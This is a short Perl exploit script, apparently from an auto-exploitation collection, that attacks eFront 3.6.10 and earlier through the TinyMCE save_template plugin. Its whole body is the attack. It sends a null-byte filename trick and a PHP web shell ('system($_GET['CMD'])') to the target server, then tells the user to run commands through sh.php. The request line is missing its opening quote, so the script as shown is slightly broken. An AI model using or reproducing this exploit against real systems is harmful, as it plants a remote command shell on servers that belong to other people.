#!/usr/bin/perl -w

use strict;
use IO::Socket;

#my $host = '127.0.0.1';
#my $port = 80;
my $host   = $ARGV[0];
my $port   = int($ARGV[1]);

print "eFront <= 3.6.10 (build 11944) 'templateName' - templateContent - RCE Exploit\n\n";
print "Reported by 'EgiX <n0b0d13s[at]gmail[dot]com>' \n\n";
print "Exploit by QUAKERDOOMER for winAUTOPWN\n";


#my $sock = IO::Socket::INET->new("${host}: ${port}") || die $!;
my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"$port") or die "Could not connect to host.\n\n";

my $req = templateName=sh.php%00&templateContent=<?system($_GET['CMD']); ?>';

print $sock "POST /efront/www/editor/tiny_mce/plugins/save_template/save_template.php HTTP/1.1\r\n";
print $sock "Host: ", $host, "\r\n";
print $sock "Content-type: application/x-www-form-urlencoded\r\n"; 
print $sock "Content-length: ", length $req, "\r\n\r\n";
print $sock $req, "\r\n\r\n";

#print while <$sock>;

close $sock;
print "Try URL/sh.php?cmd=ls NOW to test\n\n";






